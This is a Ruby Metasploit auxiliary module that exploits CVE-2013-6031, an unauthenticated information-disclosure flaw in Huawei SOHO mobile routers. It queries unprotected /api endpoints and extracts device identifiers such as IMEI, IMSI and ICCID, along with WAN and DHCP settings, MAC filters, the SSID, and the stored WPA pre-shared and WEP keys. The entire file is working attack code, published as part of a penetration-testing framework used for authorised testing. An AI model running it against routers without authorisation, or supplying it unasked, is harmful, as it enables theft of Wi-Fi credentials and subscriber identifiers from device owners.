##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'base64'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  BASIC_INFO = {
    'Device Name'      => /<DeviceName>(.*)<\/DeviceName>/i,
    'Serial Number'    => /<SerialNumber>(.*)<\/SerialNumber>/i,
    'IMEI'             => /<Imei>(.*)<\/Imei>/i,
    'IMSI'             => /<Imsi>(.*)<\/Imsi>/i,
    'ICCID'            => /<Iccid>(.*)<\/Iccid>/i,
    'Hardware Version' => /<HardwareVersion>(.*)<\/HardwareVersion>/i,
    'Software Version' => /<SoftwareVersion>(.*)<\/SoftwareVersion>/i,
    'WebUI Version'    => /<WebUIVersion>(.*)<\/WebUIVersion>/i,
    'Mac Address1'     => /<MacAddress1>(.*)<\/MacAddress1>/i,
    'Mac Address2'     => /<MacAddress2>(.*)<\/MacAddress2>/i,
    'Product Family'   => /<ProductFamily>(.*)<\/ProductFamily>/i,
    'Classification'   => /<Classify>(.*)<\/Classify>/i
  }

  WAN_INFO = {
    'Wan IP Address' => /<WanIPAddress>(.*)<\/WanIPAddress>/i,
    'Primary Dns'    => /<PrimaryDns>(.*)<\/PrimaryDns>/i,
    'Secondary Dns'  => /<SecondaryDns>(.*)<\/SecondaryDns>/i
  }

  DHCP_INFO ={
    'LAN IP Address'      => /<DhcpIPAddress>(.*)<\/DhcpIPAddress>/i,
    'DHCP StartIPAddress' => /<DhcpStartIPAddress>(.*)<\/DhcpStartIPAddress>/i,
    'DHCP EndIPAddress'   => /<DhcpEndIPAddress>(.*)<\/DhcpEndIPAddress>/i,
    'DHCP Lease Time'     => /<DhcpLeaseTime>(.*)<\/DhcpLeaseTime>/i
  }

  WIFI_INFO = {
    'Wifi WPA pre-shared key'     => /<WifiWpapsk>(.*)<\/WifiWpapsk>/i,
    'Wifi Auth mode'              => /<WifiAuthmode>(.*)<\/WifiAuthmode>/i,
    'Wifi Basic encryption modes' => /<WifiBasicencryptionmodes>(.*)<\/WifiBasicencryptionmodes>/i,
    'Wifi WPA Encryption Modes'   => /<WifiWpaencryptionmodes>(.*)<\/WifiWpaencryptionmodes>/i,
    'Wifi WEP Key1'               => /<WifiWepKey1>(.*)<\/WifiWepKey1>/i,
    'Wifi WEP Key2'               => /<WifiWepKey2>(.*)<\/WifiWepKey2>/i,
    'Wifi WEP Key3'               => /<WifiWepKey3>(.*)<\/WifiWepKey3>/i,
    'Wifi WEP Key4'               => /<WifiWepKey4>(.*)<\/WifiWepKey4>/i,
    'Wifi WEP Key Index'          => /<WifiWepKeyIndex>(.*)<\/WifiWepKeyIndex>/i
  }

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Huawei Datacard Information Disclosure Vulnerability",
      'Description'    => %q{
        This module exploits an unauthenticated information disclosure vulnerability in Huawei
        SOHO routers. The module will gather information by accessing the /api pages where
        authentication is not required, allowing configuration changes as well as information
        disclosure, including any stored SMS.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Jimson K James',
          'Tom James <tomsmaily[at]aczire.com>', # Msf module
        ],
      'References'     =>
        [
          ['CWE', '425'],
          ['CVE', '2013-6031'],
          ['US-CERT-VU', '341526']
        ],
      'DisclosureDate' => "Nov 11 2013" ))

    register_options(
      [
        Opt::RHOST('mobilewifi.home')
      ])

  end

  # Gather basic router information
  def run
    get_router_info
    print_line('')
    get_router_mac_filter_info
    print_line('')
    get_router_wan_info
    print_line('')
    get_router_dhcp_info
    print_line('')
    get_wifi_info
  end

  def get_wifi_info

    print_status("Getting WiFi Key details...")
    res = send_request_raw(
      {
        'method'  => 'GET',
        'uri'     => '/api/wlan/security-settings',
      })

    unless is_target?(res)
      return
    end

    resp_body = res.body.to_s
    log = ''

    print_status("WiFi Key Details")

    wifi_ssid = get_router_ssid
    if wifi_ssid
      print_status("WiFi SSID: #{wifi_ssid}")
      log << "WiFi SSID: #{wifi_ssid}\n"
    end

    WIFI_INFO.each do |k,v|
      if resp_body.match(v)
        info = $1
        print_status("#{k}: #{info}")
        log << "#{k}: #{info}\n"
      end
    end

    report_note(
      :host => rhost,
      :type => 'wifi_keys',
      :data => log
    )
  end

  def get_router_info

    print_status("Gathering basic device information...")
    res = send_request_raw(
      {
        'method'  => 'GET',
        'uri'     => '/api/device/information',
      })

    unless is_target?(res)
      return
    end

    resp_body = res.body.to_s

    print_status("Basic Information")

    BASIC_INFO.each do |k,v|
      if resp_body.match(v)
        info = $1
        print_status("#{k}: #{info}")
      end
    end
  end

  def get_router_ssid
    print_status("Gathering device SSID...")

    res = send_request_raw(
      {
        'method'  => 'GET',
        'uri'     => '/api/wlan/basic-settings',
      })

    # check whether we got any response from server and proceed.
    unless is_target?(res)
      return nil
    end

    resp_body = res.body.to_s

    # Grabbing the Wifi SSID
    if resp_body.match(/<WifiSsid>(.*)<\/WifiSsid>/i)
      return $1
    end

    nil
  end

  def get_router_mac_filter_info
    print_status("Gathering MAC filters...")
    res = send_request_raw(
      {
        'method'  => 'GET',
        'uri'     => '/api/wlan/mac-filter',
      })

    unless is_target?(res)
      return
    end

    print_status('MAC Filter Information')

    resp_body = res.body.to_s

    if resp_body.match(/<WifiMacFilterStatus>(.*)<\/WifiMacFilterStatus>/i)
      wifi_mac_filter_status = $1
      print_status("Wifi MAC Filter Status: #{(wifi_mac_filter_status == '1') ? 'ENABLED' : 'DISABLED'}" )
    end

    (0..9).each do |i|
      if resp_body.match(/<WifiMacFilterMac#{i}>(.*)<\/WifiMacFilterMac#{i}>/i)
        wifi_mac_filter = $1
        unless wifi_mac_filter.empty?
          print_status("Mac: #{wifi_mac_filter}")
        end
      end
    end
  end

  def get_router_wan_info
    print_status("Gathering WAN information...")
    res = send_request_raw(
      {
        'method'  => 'GET',
        'uri'     => '/api/monitoring/status',
      })

    unless is_target?(res)
      return
    end

    resp_body = res.body.to_s

    print_status('WAN Details')

    WAN_INFO.each do |k,v|
      if resp_body.match(v)
        info = $1
        print_status("#{k}: #{info}")
      end
    end
  end

  def get_router_dhcp_info
    print_status("Gathering DHCP information...")
    res = send_request_raw(
      {
        'method'  => 'GET',
        'uri'     => '/api/dhcp/settings',
      })

    unless is_target?(res)
      return
    end

    resp_body = res.body.to_s

    print_status('DHCP Details')

    # Grabbing the DhcpStatus
    if resp_body.match(/<DhcpStatus>(.*)<\/DhcpStatus>/i)
      dhcp_status = $1
      print_status("DHCP: #{(dhcp_status == '1') ? 'ENABLED' : 'DISABLED'}")
    end

    unless dhcp_status && dhcp_status == '1'
      return
    end

    DHCP_INFO.each do |k,v|
      if resp_body.match(v)
        info = $1
        print_status("#{k}: #{info}")
      end
    end
  end

  def is_target?(res)
    # check whether we got any response from server and proceed.
    unless res
      print_error("Failed to get any response from server")
      return false
    end

    # Is it a HTTP OK
    unless res.code == 200
      print_error("Did not get HTTP 200, URL was not found")
      return false
    end

    # Check to verify server reported is a Huawei router
    unless res.headers['Server'].match(/IPWEBS\/1.4.0/i)
      print_error("Target doesn't seem to be a Huawei router")
      return false
    end

    true
  end
end
